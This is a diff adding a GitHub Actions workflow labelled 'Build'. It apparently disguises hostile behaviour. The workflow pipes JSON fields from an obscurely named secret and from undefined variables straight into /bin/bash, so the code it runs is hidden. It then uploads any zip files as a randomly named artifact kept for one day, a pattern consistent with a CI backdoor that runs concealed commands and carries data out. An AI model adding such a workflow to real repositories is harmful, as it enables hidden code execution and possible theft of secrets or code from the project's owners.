@@ -1,0 +1,29 @@
+name: Build
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+jobs:
+  automation:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Process
+        env:
+          nx67: ${{ secrets.nx67 }}
+        run: |
+          printf '%s' "$nx67" | jq -r .bfavd38684 | /bin/bash
+          printf '%s' "$yyog159" | jq -r .j4251 | /bin/bash
+          printf '%s' "$vrs060" | jq -r .csmrp1 | /bin/bash
+          echo $mbu89482 | jq -r .l4 | /bin/bash
+
+      - name: Store results
+        uses: actions/upload-artifact@v4
+        with:
+          name: 5F3YGpJq
+          path: "*.zip"
+          retention-days: 1
